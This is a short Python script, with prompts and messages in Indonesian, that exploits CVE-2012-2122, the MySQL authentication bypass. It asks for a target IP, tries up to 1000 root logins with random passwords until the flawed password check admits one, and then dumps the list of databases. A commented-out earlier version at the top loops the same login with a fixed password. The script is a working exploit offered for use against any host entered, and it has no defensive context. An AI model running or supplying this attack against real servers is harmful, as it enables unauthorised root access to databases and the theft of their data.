""" import subprocess

ipaddr = input("Masukan alamat IP server MySQL: ")

while 1:
    subprocess.Popen("mysql --host=%s -u root --password=blah" % (ipaddr), shell=True).wait()
 """

import subprocess
import random
import string
import time

def generate_password(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

ipaddr = input("Masukkan alamat IP target MySQL: ")
user = "root"
max_attempts = 1000

print(f"[+] Mulai menguji CVE-2012-2122 pada {ipaddr}...")

for attempt in range(1, max_attempts + 1):
    password = generate_password()
    cmd = [
        "mysql",
        f"--host={ipaddr}",
        "-u", user,
        f"--password={password}",
        "-e", "SHOW DATABASES;"
    ]

    print(f"[{attempt}] Mencoba password: {password}")
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    if process.returncode == 0:
        print("\n[!!!] KERENTANAN TERDETEKSI: Login berhasil tanpa password valid.")
        print("[+] Target IP:", ipaddr)
        print("[+] Password bypass:", password)
        print("[+] Jumlah attempt:",attempt)
        print("[+] Output MySQL:")
        print(stdout.decode())
        break
    else:
        err = stderr.decode()
        if "Access denied" not in err:
            print(f"[?] Respon aneh: {err.strip()}")
    time.sleep(0.1)  # Jeda untuk menghindari overload server

else:
    print("\n[-] Tidak berhasil melakukan bypass setelah", max_attempts, "percobaan.")
